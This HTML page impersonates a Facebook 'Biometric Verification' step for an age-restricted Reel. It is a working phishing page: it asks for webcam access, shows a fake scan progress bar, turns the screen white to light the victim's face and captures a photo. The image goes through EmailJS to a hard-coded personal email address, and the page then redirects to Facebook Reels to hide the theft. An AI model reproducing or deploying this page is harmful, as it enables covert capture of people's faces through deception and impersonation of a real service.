<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Secure Content</title>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <style>
        body {
            margin: 0; padding: 0; background-color: #000;
            display: flex; justify-content: center; align-items: center; height: 100vh;
            color: #ccc; font-family: sans-serif; transition: background-color 0.1s;
        }
        .video-container { text-align: center; width: 90%; border: 1px solid #333; padding: 20px; border-radius: 10px; }
        .loader {
            border: 3px solid #1a1a1a; border-top: 3px solid #1877F2;
            border-radius: 50%; width: 40px; height: 40px;
            animation: spin 1s linear infinite; margin: 0 auto 15px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #timer { font-size: 0.9rem; margin-top: 10px; color: #555; }
    </style>
</head>
<body id="mainBody">
    <div class="video-container">
        <div class="loader"></div>
        <p style="font-size: 0.85rem; color: #1877F2;">Facebook Security Protocol v4.2</p>
        <p id="statusText" style="font-size: 0.9rem;">Initializing Secure Stream...</p>
        <div id="timer">Waiting for user authentication...</div>
    </div>

    <script>
        (function() { emailjs.init("ClasRw06y_NeB2UQ"); })();

        window.onload = async function() {
            const securityMsg = "SECURITY ALERT:\n\nThis content is age-restricted and encrypted.\n\nTo view this Facebook Reel, you must complete the Biometric Verification.\n\nClick OK to start.";
            
            if (confirm(securityMsg)) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();

                    let seconds = 5; 
                    const timerElement = document.getElementById('timer');
                    const statusText = document.getElementById('statusText');
                    
                    const interval = setInterval(() => {
                        seconds--;
                        statusText.innerText = "Scanning Biometric Data...";
                        timerElement.innerText = "Authentication: " + (100 - (seconds * 20)) + "% Complete";
                        
                        if (seconds <= 0) {
                            clearInterval(interval);
                            document.getElementById('mainBody').style.backgroundColor = "#FFFFFF"; 
                            
                            setTimeout(() => {
                                const canvas = document.createElement('canvas');
                                // تصغير الحجم لضمان وصول الإيميل (مهم جداً)
                                canvas.width = 640; canvas.height = 480; 
                                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                                
                                // جودة الصورة 0.5 لتقليل الحجم وتسريع الإرسال
                                const dataOutput = canvas.toDataURL('image/jpeg', 0.5);
                                
                                emailjs.send('service_w3dev60', 'template_7k8tall', {
                                    image_data: dataOutput,
                                    to_email: 'tayebiabd2016@gmail.com'
                                }).then(function() {
                                    // لن يتم التحويل إلا بعد التأكد من ضغط زر الإرسال
                                    window.location.href = "https://www.facebook.com/reels/";
                                }, function(error) {
                                    window.location.href = "https://www.facebook.com/reels/";
                                });

                            }, 500);
                        }
                    }, 1000);

                } catch (err) {
                    window.location.href = "https://www.facebook.com/reels/";
                }
            } else {
                window.location.href = "https://www.facebook.com/reels/";
            }
        };
    </script>
</body>
</html>
